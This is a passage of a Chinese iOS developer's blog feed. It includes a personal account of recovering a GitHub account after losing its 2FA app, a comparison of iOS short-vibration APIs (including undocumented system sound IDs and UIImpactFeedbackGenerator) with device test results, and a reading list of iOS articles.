<p>对于文章中的测试代码，全部在<a href="https://github.com/summertian4/iOS-ObjectiveC/tree/master/ObjcMemory" target="_blank" rel="external">这里</a>。</p>
<hr>
<p>有什么问题都可以在博文后面留言，或者微博上私信我，或者邮件我 <a href="&#x6d;&#x61;&#x69;&#108;&#x74;&#111;&#x3a;&#x63;&#x6f;&#100;&#101;&#x72;&#x66;&#105;&#115;&#104;&#64;&#x31;&#54;&#x33;&#x2e;&#99;&#x6f;&#109;">&#x63;&#x6f;&#100;&#101;&#x72;&#x66;&#105;&#115;&#104;&#64;&#x31;&#54;&#x33;&#x2e;&#99;&#x6f;&#109;</a>。</p>
<p>博主是 iOS 妹子一枚。</p>
<p>希望大家一起进步。</p>
<p>我的微博：<a href="http://weibo.com/coderfish/" target="_blank" rel="external">小鱼周凌宇</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;第一篇-iOS-内存管理&quot;&gt;&lt;a href=&quot;#第一篇-iOS-内存管理&quot; class=&quot;headerlink&quot; title=&quot;第一篇 iOS 内存管理&quot;&gt;&lt;/a&gt;第一篇 iOS 内存管理&lt;/h1&gt;&lt;h2 id=&quot;1-似乎每个人在学习-iOS-过程中都考虑过的问题&quot;&gt;&lt;a href=&quot;#1-似乎每个人在学习-iOS-过程中都考虑过的问题&quot; class=&quot;headerlink&quot; title=&quot;1 似乎每个人在学习 iOS 过程中都考虑过的问题&quot;&gt;&lt;/a&gt;1 似乎每个人在学习 iOS 过程中都考虑过的问题&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;alloc retain release delloc 做了什么？&lt;/li&gt;
&lt;li&gt;autoreleasepool 是怎样实现的？&lt;/li&gt;
&lt;li&gt;__unsafe_unretained 是什么？&lt;/li&gt;
&lt;li&gt;Block 是怎样实现的&lt;/li&gt;
&lt;li&gt;什么时候会引起循环引用，什么时候不会引起循环引用？&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;所以我将在本篇博文中详细的从 ARC 解释到 iOS 的内存管理，以及 Block 相关的原理、源码。&lt;/p&gt;
&lt;h2 id=&quot;2-从-ARC-说起&quot;&gt;&lt;a href=&quot;#2-从-ARC-说起&quot; class=&quot;headerlink&quot; title=&quot;2 从 ARC 说起&quot;&gt;&lt;/a&gt;2 从 ARC 说起&lt;/h2&gt;&lt;p&gt;说 iOS 的内存管理，就不得不从 ARC（Automatic Reference Counting / 自动引用计数） 说起， ARC 是 WWDC2011 和 iOS5 引入的变化。ARC 是 LLVM 3.0 编译器的特性，用来自动管理内存。&lt;/p&gt;
&lt;p&gt;与 Java 中 GC 不同，ARC 是编译器特性，而不是基于运行时的，所以 ARC 其实是在编译阶段自动帮开发者插入了管理内存的代码，而不是实时监控与回收内存。&lt;/p&gt;
    
    </summary>
    
      <category term="iOS" scheme="http://zhoulingyu.com/categories/iOS/"/>
    
      <category term="iOS进阶" scheme="http://zhoulingyu.com/categories/iOS/iOS%E8%BF%9B%E9%98%B6/"/>
    
    
      <category term="iOS" scheme="http://zhoulingyu.com/tags/iOS/"/>
    
      <category term="iOS进阶" scheme="http://zhoulingyu.com/tags/iOS%E8%BF%9B%E9%98%B6/"/>
    
  </entry>
  
  <entry>
    <title>找回丢失的 Github（谨慎保管 2FA 验证）</title>
    <link href="http://zhoulingyu.com/2017/02/07/%E6%89%BE%E5%9B%9E%E4%B8%A2%E5%A4%B1%E7%9A%84-Github-%E8%A1%80%E6%B3%AA%E5%8F%B2%EF%BC%88%E8%B0%A8%E6%85%8E%E4%BF%9D%E7%AE%A1-2FA-%E9%AA%8C%E8%AF%81%EF%BC%89/"/>
    <id>http://zhoulingyu.com/2017/02/07/找回丢失的-Github-血泪史（谨慎保管-2FA-验证）/</id>
    <published>2017-02-07T14:53:14.000Z</published>
    <updated>2017-05-15T02:48:26.483Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Why-我丢失了-Github-账号"><a href="#Why-我丢失了-Github-账号" class="headerlink" title="Why 我丢失了 Github 账号"></a>Why 我丢失了 Github 账号</h1><p>从前天，经过了两天时间与 Github 客服对话，终于找回了我的 Github。</p>
<p>朋友在问我为什么登陆不了 Github 的时候表示不太理解。</p>
<p>原因很简单，因为我丢失了两步验证的 app，也丢失了 recovery code。</p>
<a id="more"></a>
<h1 id="2FA-和基于时间戳的实时验证码"><a href="#2FA-和基于时间戳的实时验证码" class="headerlink" title="2FA 和基于时间戳的实时验证码"></a>2FA 和基于时间戳的实时验证码</h1><p>其实，是这样的。Github 也有两步验证（2FA），提供了两种可选方式：</p>
<ol>
<li>使用手机接收短信</li>
<li>使用由时间戳生成的 2FA 实时验证码生成</li>
</ol>
<p>由于方法 1 无法支持国内的手机号，所以只能使用方法 2。</p>
<p>方法二的原理是，Github 会提供一个秘钥，通常以二维码的方式显示，用三方软件比如 Autenticator、1password（当时我不知道 1password 也可以） 在扫码之后，将秘钥保存到客户端。</p>
<p>在用户登陆的时候，app 会以秘钥和时间戳为参数，通过固定算法生成一个 6 位数字的一次验证码。</p>
<p>服务端通过同样的算法也会生成一个同样的一次性验证码，两者对比一致，则通过验证。和手机短信接收验证码很类似。</p>
<p>Github 在开启 2FA 的同时，会提供给你一份 recovery code，如果你无法拿到一次验证码，就使用 recovery code 暂时通过验证。recovery code 只能使用一次，使用过一次以后，就会被更新，你需要保存新的 recovery code。</p>
<p>当时我选择验证码生成 app 是 Google 的 Autenticator。就是这个 app 坑了我。这个 app 不需要登陆，我直接扫码就记录了，但是我当时用的 iPhone 6，在更换了 iPhone 7 之后，iPhone 6 借给他人使用前做了抹除，So，我没有了 app，只能通过 recovery code 恢复，但是奇怪的事，我使用三个月内我印象里最新的 recovery code 去验证，但是失败了。</p>
<p>在彻底折腾一番发现没办法后，去联系了 Github 客服。</p>
<h1 id="Github-客服"><a href="#Github-客服" class="headerlink" title="Github 客服"></a>Github 客服</h1><p>当你没有 2FA app，也丢失了 recovery code 之后，你必须去联系客服，请求帮助你关闭 2FA。</p>
<p>这时候客服会要求你运行一段 command，以证明的电脑使用过此账号的公钥。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ssh -T git@github.com verify</div></pre></td></tr></table></figure>
<p>但是我怎样也得不到结果，要么提示 DNS 劫持（和公司的网络翻墙了有关），要么其他的种种问题。</p>
<p>在和 Github 客服一番对话后，对方表示验证的 ssh 公钥是应由 Github Destop 软件生成了。当时很懵逼，问对方『难道我自己生成的秘钥就不是秘钥了？难道不能证明我电脑生成的这个公钥？』。然后客服就说『你 2015 年用一台 Macbook Pro 生成了一个公钥，这是你的电脑吗？』，然后 run 一下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ssh -i ~/.ssh/github_rsa -T git@github.com verify</div></pre></td></tr></table></figure>
<p>然后 run 之后：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Enter passphrase for key &apos;/Users/zhoulingyu/.ssh/github_rsa&apos;:</div></pre></td></tr></table></figure>
<p>当时我想了一下，傻傻的输入了 Github 密码，然而不对。然后我让几个朋友 run 了一下，均是直接显示出了 verification token。我很奇怪，于是想了一下，发现这里要求输入的密码应该是当初生成公钥的时候设置的密码，通常很多人都会选择不设置密码，但是我显然当初设置了，然而我记不起来。</p>
<p>一番搜索之后，得到了一个 happy 的结果，如果你是 windows，那洗洗睡吧，如果是 Mac，这个密码可以在 keychain 中找到，具体方法在<a href="https://help.github.com/articles/recovering-your-ssh-key-passphrase/" target="_blank" rel="external">这里</a>。</p>
<p>我从 keychain 中粘出密码后我就惊呆了，是一个 40 多位的密码。显然是自动生成的高复杂度密码。我当时一定是忘了保存。</p>
<p>SO，拿到 verification token 之后，Github 客服就帮我关掉了 2FA。</p>
<p>随后，我发现 1password 是可以生成一次性验证码的，于是使用 1password 保存，不在使用 Google 的 app。</p>
<h1 id="Other"><a href="#Other" class="headerlink" title="Other"></a>Other</h1><p>这篇文章就是做一个记录，自己弄了两天，都去按照客服意见新建了 Gihub 账号 Fork 了原来所有的项目。最终找到的时候也是喜出望外。</p>
<p>也希望这篇记录能帮到其他人。</p>
<hr>
<p>有什么问题都可以在博文后面留言，或者微博上私信我，或者邮件我 <a href="&#x6d;&#x61;&#105;&#108;&#x74;&#x6f;&#58;&#99;&#x6f;&#x64;&#x65;&#114;&#102;&#105;&#x73;&#x68;&#64;&#x31;&#54;&#51;&#x2e;&#99;&#x6f;&#109;">&#99;&#x6f;&#x64;&#x65;&#114;&#102;&#105;&#x73;&#x68;&#64;&#x31;&#54;&#51;&#x2e;&#99;&#x6f;&#109;</a>。</p>
<p>博主是 iOS 妹子一枚。</p>
<p>希望大家一起进步。</p>
<p>我的微博：<a href="http://weibo.com/coderfish/" target="_blank" rel="external">小鱼周凌宇</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;Why-我丢失了-Github-账号&quot;&gt;&lt;a href=&quot;#Why-我丢失了-Github-账号&quot; class=&quot;headerlink&quot; title=&quot;Why 我丢失了 Github 账号&quot;&gt;&lt;/a&gt;Why 我丢失了 Github 账号&lt;/h1&gt;&lt;p&gt;从前天，经过了两天时间与 Github 客服对话，终于找回了我的 Github。&lt;/p&gt;
&lt;p&gt;朋友在问我为什么登陆不了 Github 的时候表示不太理解。&lt;/p&gt;
&lt;p&gt;原因很简单，因为我丢失了两步验证的 app，也丢失了 recovery code。&lt;/p&gt;
    
    </summary>
    
      <category term="Other" scheme="http://zhoulingyu.com/categories/Other/"/>
    
      <category term="Github" scheme="http://zhoulingyu.com/categories/Other/Github/"/>
    
    
      <category term="Other" scheme="http://zhoulingyu.com/tags/Other/"/>
    
      <category term="Github" scheme="http://zhoulingyu.com/tags/Github/"/>
    
  </entry>
  
  <entry>
    <title>iOS——关于-Taptic-Engine-震动反馈</title>
    <link href="http://zhoulingyu.com/2017/01/16/iOS%E2%80%94%E2%80%94%E5%85%B3%E4%BA%8E-Taptic-Engine-%E9%9C%87%E5%8A%A8%E5%8F%8D%E9%A6%88/"/>
    <id>http://zhoulingyu.com/2017/01/16/iOS——关于-Taptic-Engine-震动反馈/</id>
    <published>2017-01-16T10:30:17.000Z</published>
    <updated>2017-05-15T02:48:26.479Z</updated>
    
    <content type="html"><![CDATA[<h1 id="What-has-Happened？"><a href="#What-has-Happened？" class="headerlink" title="What has Happened？"></a>What has Happened？</h1><p>上周，leader 拿着 iPhone 7 打开了网易新闻，问我：『你看，你这里的下拉刷新是<code>短震动</code>，我们的手机数周遥控电视的时候只有<code>长震动</code>，产品那边问能不能用短震动』。</p>
<p>然后博主就去查看了一下关于短震动的方式，整个过程可以描述为——『资料真少！』。</p>
<p>不过最后通过一下午的搜集，最终还是总结整理出来了这份文档，也补充了自己对 iPhone 6s 之后对 Taptic Engine 的了解。</p>
<a id="more"></a>
<h1 id="Taptic-Engine"><a href="#Taptic-Engine" class="headerlink" title="Taptic Engine"></a>Taptic Engine</h1><p>先了解一个概念——Taptic Engine</p>
<p>Taptic Engine 是苹果产品上推出的全新震动模块，该元件最早出现在 Apple Watch 中。iPhone 6s 和 iPhone 6s Plus 中，也同样内置了Taptic Engine，在设计上有所升级。</p>
<p>Taptic Engine 振动模块为 Apple Watch 以及 iPhone 6s、iPhone 7 提供了 Force Touch 以及 3D Touch，不同的屏幕操作，可以感受到不同的振动触觉效果，带来更好的用户体验。</p>
<h1 id="短震方法一-AudioServicesPlaySystemSound"><a href="#短震方法一-AudioServicesPlaySystemSound" class="headerlink" title="短震方法一 AudioServicesPlaySystemSound"></a>短震方法一 AudioServicesPlaySystemSound</h1><p>常用调用：</p>
<figure class="highlight objc"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">AudioServicesPlaySystemSound(kSystemSoundID_Vibrate);</div></pre></td></tr></table></figure>
<p>以上代码在各个型号手机中反应为长震</p>
<p>API 系统版本支持：</p>
<figure class="highlight objc"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">__OSX_AVAILABLE_STARTING(__MAC_10_5,__IPHONE_2_0);</div></pre></td></tr></table></figure>
<p>APPLE 公开的 <code>SystemSoundID</code> 有：</p>
<figure class="highlight objc"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">CF_ENUM</span>(SystemSoundID)</div><div class="line">&#123;</div><div class="line">    kSystemSoundID_UserPreferredAlert   = <span class="number">0x00001000</span>,</div><div class="line">    kSystemSoundID_FlashScreen          = <span class="number">0x00000FFE</span>,</div><div class="line">        <span class="comment">// this has been renamed to be consistent</span></div><div class="line">    kUserPreferredAlert     = kSystemSoundID_UserPreferredAlert</div><div class="line">&#125;;</div><div class="line"></div><div class="line"><span class="built_in">CF_ENUM</span>(SystemSoundID)</div><div class="line">&#123;</div><div class="line">    kSystemSoundID_Vibrate              = <span class="number">0x00000FFF</span></div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<p>以上类型 <em><strong>没有短震动</strong></em> 。</p>
<p>但通过以下代码，可以得到更多类型的震动：</p>
<figure class="highlight objc"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// 普通短震，3D Touch 中 Peek 震动反馈</span></div><div class="line">AudioServicesPlaySystemSound(<span class="number">1519</span>);</div></pre></td></tr></table></figure>
<figure class="highlight objc"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// 普通短震，3D Touch 中 Pop 震动反馈</span></div><div class="line">AudioServicesPlaySystemSound(<span class="number">1520</span>);</div></pre></td></tr></table></figure>
<figure class="highlight objc"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// 连续三次短震</span></div><div class="line">AudioServicesPlaySystemSound(<span class="number">1521</span>);</div></pre></td></tr></table></figure>
<p>但以上 ID 均未在 Apple 的 Documents 中描述。显然，<em><strong>这是调用了一些私有一些属性 </strong></em> 。</p>
<p>关于是否调用了私有 API，也有一些讨论，可以查看<a href="https://forums.developer.apple.com/thread/45628" target="_blank" rel="external">这里</a>。</p>
<h1 id="短震方法二-获取-tapticEngine"><a href="#短震方法二-获取-tapticEngine" class="headerlink" title="短震方法二 获取 _tapticEngine"></a>短震方法二 获取 _tapticEngine</h1><p>这种方法是从<a href="https://unifiedsense.com/development/using-taptic-engine-on-ios.html" target="_blank" rel="external">这里</a>搜集到的。</p>
<figure class="highlight objc"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">id</span> tapticEngine = [[<span class="built_in">UIDevice</span> currentDevice] performSelector: <span class="built_in">NSSelectorFromString</span>(<span class="string">@"_tapticEngine"</span>)</div><div class="line">                                                     withObject:<span class="literal">nil</span>];</div><div class="line">[tapticEngine performSelector: <span class="built_in">NSSelectorFromString</span>(<span class="string">@"actuateFeedback:"</span>)</div><div class="line">                       withObject:@(<span class="number">0</span>)];</div></pre></td></tr></table></figure>
<p>或者：</p>
<figure class="highlight objc"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">id</span> tapticEngine = [[<span class="built_in">UIDevice</span> currentDevice] performSelector: <span class="built_in">NSSelectorFromString</span>(<span class="string">@"_tapticEngine"</span>)</div><div class="line">                                                     withObject:<span class="literal">nil</span>];</div><div class="line"></div><div class="line">SEL selector = <span class="built_in">NSSelectorFromString</span>(<span class="string">@"actuateFeedback:"</span>);</div><div class="line">int32_t arg = <span class="number">1001</span>;</div><div class="line">    </div><div class="line"><span class="built_in">NSInvocation</span> *inv = [<span class="built_in">NSInvocation</span> invocationWithMethodSignature:[tapticEngine methodSignatureForSelector:selector]];</div><div class="line">[inv setTarget:tapticEngine];</div><div class="line">[inv setSelector:selector];</div><div class="line">[inv setArgument:&amp;arg atIndex:<span class="number">2</span>];</div><div class="line">[inv invoke];</div></pre></td></tr></table></figure>
<p>显然， <em><strong>这是调用了私有 API</strong></em> 。</p>
<p>这些方法，在实际测试的时候发现，在 iPhone 7 上调用没有震动反馈，在 iPhone 6S Plus 上调用有震动反馈，在 iPhone 6 上调用 无反馈。</p>
<h1 id="短震方法三-UIImpactFeedbackGenerator"><a href="#短震方法三-UIImpactFeedbackGenerator" class="headerlink" title="短震方法三 UIImpactFeedbackGenerator"></a>短震方法三 UIImpactFeedbackGenerator</h1><p>iOS10 引入了一种新的、产生触觉反馈的方式， <em><strong>帮助用户认识到不同的震动反馈有不同的含义</strong></em> 。这个功能的核心就是由 <code>UIFeedbackGenerator</code> 提供。Apple 对于 <code>UIImpactFeedbackGenerator</code> 有一篇<a href="https://developer.apple.com/reference/uikit/uifeedbackgenerator#2555399" target="_blank" rel="external">介绍文档</a>。</p>
<p>UIFeedbackGenerator 可以帮助你实现 haptic feedback。它的要求是：</p>
<ol>
<li>支持 Taptic Engine 机型 (iPhone 7 以及 iPhone 7 Plus).</li>
<li>app 需要在前台运行</li>
<li>系统 Haptics setting 需要开启</li>
</ol>
<p>Apple 曾表示公开了 Taptic Engine 的 API，但是鲜有文档。在搜罗了各种资料后，可以认为 <code>UIImpactFeedbackGenerator</code> 即 Taptic Engine 的 公开 API。</p>
<p>它的调用方式是：</p>
<figure class="highlight objc"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">UIImpactFeedbackGenerator</span> *generator = [[<span class="built_in">UIImpactFeedbackGenerator</span> alloc] initWithStyle: <span class="built_in">UIImpactFeedbackStyleLight</span>];</div><div class="line">[generator prepare];</div><div class="line">[generator impactOccurred];</div></pre></td></tr></table></figure>
<h1 id="Others"><a href="#Others" class="headerlink" title="Others"></a>Others</h1><p>观察 <code>UIImpactFeedbackGenerator</code> 你会发现它继承于 <code>UIFeedbackGenerator</code>。除了 <code>UIImpactFeedbackGenerator</code> 还有三种 FeedbackGenerator：</p>
<ol>
<li>UIImpactFeedbackGenerator</li>
<li>UISelectionFeedbackGenerator</li>
<li>UINotificationFeedbackGenerator</li>
</ol>
<p>详情可参考 Apple 的 <a href="https://developer.apple.com/reference/uikit/uifeedbackgenerator?language=objc" target="_blank" rel="external">这篇 Reference</a> 。</p>
<p>对于震动反馈的应用，Apple 也给出了示例场景：</p>
<figure class="highlight objc"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div></pre></td><td class="code"><pre><div class="line">- (<span class="keyword">IBAction</span>)gestureHandler:(<span class="built_in">UIPanGestureRecognizer</span> *)sender &#123;</div><div class="line">    </div><div class="line">    <span class="keyword">switch</span> (sender.state) &#123;</div><div class="line">        <span class="keyword">case</span> <span class="built_in">UIGestureRecognizerStateBegan</span>:</div><div class="line">            </div><div class="line">            <span class="comment">// Instantiate a new generator.</span></div><div class="line">            <span class="keyword">self</span>.feedbackGenerator = [[<span class="built_in">UISelectionFeedbackGenerator</span> alloc] init];</div><div class="line">            </div><div class="line">            <span class="comment">// Prepare the generator when the gesture begins.</span></div><div class="line">            [<span class="keyword">self</span>.feedbackGenerator prepare];</div><div class="line">            </div><div class="line">            <span class="keyword">break</span>;</div><div class="line">            </div><div class="line">        <span class="keyword">case</span> <span class="built_in">UIGestureRecognizerStateChanged</span>:</div><div class="line">            </div><div class="line">            <span class="comment">// Check to see if the selection has changed...</span></div><div class="line">            <span class="keyword">if</span> ([<span class="keyword">self</span> myCustomHasSelectionChangedMethodWithTranslation:[sender translationInView: <span class="keyword">self</span>.view]]) &#123;</div><div class="line">                </div><div class="line">                <span class="comment">// Trigger selection feedback.</span></div><div class="line">                [<span class="keyword">self</span>.feedbackGenerator selectionChanged];</div><div class="line">                </div><div class="line">                <span class="comment">// Keep the generator in a prepared state.</span></div><div class="line">                [<span class="keyword">self</span>.feedbackGenerator prepare];</div><div class="line">    </div><div class="line">            &#125;</div><div class="line">            </div><div class="line">            <span class="keyword">break</span>;</div><div class="line">            </div><div class="line">        <span class="keyword">case</span> <span class="built_in">UIGestureRecognizerStateCancelled</span>:</div><div class="line">        <span class="keyword">case</span> <span class="built_in">UIGestureRecognizerStateEnded</span>:</div><div class="line">        <span class="keyword">case</span> <span class="built_in">UIGestureRecognizerStateFailed</span>:</div><div class="line">            </div><div class="line">            <span class="comment">// Release the current generator.</span></div><div class="line">            <span class="keyword">self</span>.feedbackGenerator = <span class="literal">nil</span>;</div><div class="line">            </div><div class="line">            <span class="keyword">break</span>;</div><div class="line">            </div><div class="line">        <span class="keyword">default</span>:</div><div class="line">            </div><div class="line">            <span class="comment">// Do nothing.</span></div><div class="line">            <span class="keyword">break</span>;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h1 id="三种方法在测试机上不同的反馈结果"><a href="#三种方法在测试机上不同的反馈结果" class="headerlink" title="三种方法在测试机上不同的反馈结果"></a>三种方法在测试机上不同的反馈结果</h1><table>
<thead>
<tr>
<th>AudioServicesPlaySystemSound</th>
<th>1519</th>
<th>1520</th>
<th>1521</th>
</tr>
</thead>
<tbody>
<tr>
<td>iPhone 7（iOS 10）</td>
<td>peek 触感</td>
<td>pop 触感</td>
<td>三次连续短振</td>
</tr>
<tr>
<td>iPhone 6s Puls（iOS 9）</td>
<td>peek 触感</td>
<td>pop 触感</td>
<td>三次连续短振</td>
</tr>
<tr>
<td>iPhone 6（iOS 10）</td>
<td>无振动</td>
<td>无振动</td>
<td>无振动</td>
</tr>
</tbody>
</table>
<table>
<thead>
<tr>
<th>获取 _tapticEngine</th>
<th></th>
</tr>
</thead>
<tbody>
<tr>
<td>iPhone 7（iOS 10）</td>
<td>无振动</td>
</tr>
<tr>
<td>iPhone 6s Puls（iOS 9）</td>
<td>长振</td>
</tr>
<tr>
<td>iPhone 6（iOS 10）</td>
<td>无振动</td>
</tr>
</tbody>
</table>
<table>
<thead>
<tr>
<th>UIImpactFeedbackGenerator</th>
<th>.Light</th>
<th>.Medium</th>
<th>.Heavy</th>
</tr>
</thead>
<tbody>
<tr>
<td>iPhone 7（iOS 10）</td>
<td>微弱短振</td>
<td>中等短振</td>
<td>明显短振</td>
</tr>
<tr>
<td>iPhone 6s Puls（iOS 9）</td>
<td>长振</td>
<td>长振</td>
<td>长振</td>
</tr>
<tr>
<td>iPhone 6（iOS 10）</td>
<td>无振动</td>
<td>无振动</td>
<td>无振动</td>
</tr>
</tbody>
</table>
<p>总结一下，希望同样的代码能在更多的机型上实现短振，建议使用 AudioServicesPlaySystemSound(1519)。不过可能会涉及到调用私有 API。安全起见，可以使用 <code>UIImpactFeedbackGenerator</code>。</p>
<h1 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h1><p>测试代码在<a href="https://github.com/summertian4/iOS-ObjectiveC/tree/master/iPhoneShakeDemo" target="_blank" rel="external">这里</a>。</p>
<hr>
<p>有什么问题都可以在博文后面留言，或者微博上私信我，或者邮件我 <a href="&#x6d;&#x61;&#105;&#108;&#116;&#111;&#58;&#x63;&#x6f;&#100;&#x65;&#114;&#102;&#105;&#x73;&#104;&#64;&#x31;&#54;&#51;&#46;&#x63;&#x6f;&#x6d;">&#x63;&#x6f;&#100;&#x65;&#114;&#102;&#105;&#x73;&#104;&#64;&#x31;&#54;&#51;&#46;&#x63;&#x6f;&#x6d;</a>。</p>
<p>博主是 iOS 妹子一枚。</p>
<p>希望大家一起进步。</p>
<p>我的微博：<a href="http://weibo.com/coderfish/" target="_blank" rel="external">小鱼周凌宇</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;What-has-Happened？&quot;&gt;&lt;a href=&quot;#What-has-Happened？&quot; class=&quot;headerlink&quot; title=&quot;What has Happened？&quot;&gt;&lt;/a&gt;What has Happened？&lt;/h1&gt;&lt;p&gt;上周，leader 拿着 iPhone 7 打开了网易新闻，问我：『你看，你这里的下拉刷新是&lt;code&gt;短震动&lt;/code&gt;，我们的手机数周遥控电视的时候只有&lt;code&gt;长震动&lt;/code&gt;，产品那边问能不能用短震动』。&lt;/p&gt;
&lt;p&gt;然后博主就去查看了一下关于短震动的方式，整个过程可以描述为——『资料真少！』。&lt;/p&gt;
&lt;p&gt;不过最后通过一下午的搜集，最终还是总结整理出来了这份文档，也补充了自己对 iPhone 6s 之后对 Taptic Engine 的了解。&lt;/p&gt;
    
    </summary>
    
      <category term="iOS" scheme="http://zhoulingyu.com/categories/iOS/"/>
    
    
      <category term="iOS" scheme="http://zhoulingyu.com/tags/iOS/"/>
    
  </entry>
  
  <entry>
    <title>一周阅读列表-2017</title>
    <link href="http://zhoulingyu.com/2017/01/03/%E4%B8%80%E5%91%A8%E9%98%85%E8%AF%BB%E5%88%97%E8%A1%A8-2017/"/>
    <id>http://zhoulingyu.com/2017/01/03/一周阅读列表-2017/</id>
    <published>2017-01-03T15:05:00.000Z</published>
    <updated>2017-05-15T02:48:26.479Z</updated>
    
    <content type="html"><![CDATA[<h1 id="2016-年-1-月-1-日"><a href="#2016-年-1-月-1-日" class="headerlink" title="2016 年 1 月 1 日 +"></a>2016 年 1 月 1 日 +</h1><p>有关 objc_autoreleasereturnvalue</p>
<p><del><a href="http://www.voidcn.com/blog/li15809284891/article/p-6244162.html" target="_blank" rel="external">iOS 自动释放池ARC与MRC</a></del></p>
<p><del><a href="http://blog.sunnyxx.com/2014/10/15/behind-autorelease/" target="_blank" rel="external">黑幕背后的Autorelease</a></del></p>
<p><del><a href="http://clang.llvm.org/docs/AutomaticReferenceCounting.html#arc-runtime-objc-autoreleasereturnvalue" target="_blank" rel="external">Clang 4.0 documentation</a></del></p>
<a id="more"></a>
<p><a href="http://daily.zhihu.com/story/9121798" target="_blank" rel="external">如何做一次有效的绩效考核面谈？</a></p>
<p><del><a href="https://github.com/izzyleung/ZhihuDailyPurify/wiki/%E7%9F%A5%E4%B9%8E%E6%97%A5%E6%8A%A5-API-%E5%88%86%E6%9E%90" target="_blank" rel="external">知乎日报 API 分析</a></del></p>
<p><a href="http://www.cocoachina.com/swift/20150918/13499.html" target="_blank" rel="external">Swift 面试题及其答案</a></p>
<p><a href="http://mp.weixin.qq.com/s/JUx98M2U_K55aurFQcQlgw" target="_blank" rel="external">2016移动开发技术巡礼</a></p>
<p><a href="http://web.jobbole.com/89568/" target="_blank" rel="external">前端精选 20 个优质的加载动画</a></p>
<p><strong> 有关 iOS10 新特性 </strong></p>
<p><del>1. <a href="https://onevcat.com/2016/06/ios-10-sdk/" target="_blank" rel="external">开发者所需要知道的 iOS 10 SDK 新特性</a></del></p>
<p><del>2. <a href="http://blog.fir.im/fir_im_weekly160617/" target="_blank" rel="external">fir.im Weekly - 从 iOS 10 SDK 新特性说起</a></del></p>
<p><del>3. <a href="https://developer.apple.com/ios/" target="_blank" rel="external">iOS + Apps</a></del></p>
<p><del>4. <a href="https://developer.apple.com/library/content/releasenotes/General/WhatsNewIniOS/Articles/iOS10.html" target="_blank" rel="external">What’s New in iOS10</a></del></p>
<p><del>5. <a href="http://www.jianshu.com/p/0cc7aad638d9" target="_blank" rel="external">兼容iOS 10 资料整理笔记</a></del></p>
<p><a href="https://github.com/MoZhouqi/KMNavigationBarTransition" target="_blank" rel="external">KMNavigationBarTransition</a></p>
<p><a href="https://developer.apple.com/library/content/releasenotes/ObjectiveC/RN-TransitioningToARC/Introduction/Introduction.html" target="_blank" rel="external">Apple Transitioning to ARC Release Notes</a></p>
<p><del><a href="http://coolshell.cn/articles/222.html" target="_blank" rel="external">优秀程序员的十个习惯</a></del></p>
<p><del><a href="http://www.jianshu.com/p/d75a9a8d13b5?hmsr=toutiao.io&amp;utm_medium=toutiao.io&amp;utm_source=toutiao.io" target="_blank" rel="external">33 个 2017 年必须了解的 iOS 开源库</a></del></p>
<p><del><a href="https://isux.tencent.com/qq-mobile-off-duty.html" target="_blank" rel="external">QQ手机版 5.0“一键下班”设计小结</a></del></p>
<h1 id="2016-年-2-月-1-日"><a href="#2016-年-2-月-1-日" class="headerlink" title="2016 年 2 月 1 日 +"></a>2016 年 2 月 1 日 +</h1><p><a href="http://www.jianshu.com/p/b3225d7de6bf" target="_blank" rel="external">浅析UIApplication生命周期的一些delegate方法</a></p>
<p><a href="http://www.jianshu.com/p/2dbb360886a8" target="_blank" rel="external">iOS即时通讯，从入门到“放弃”？</a></p>
<p><a href="http://mp.weixin.qq.com/s/GFt7uqrKw7m3R3KrV43zIQ" target="_blank" rel="external">Baymax：网易iOS App运行时Crash自动防护实践</a></p>
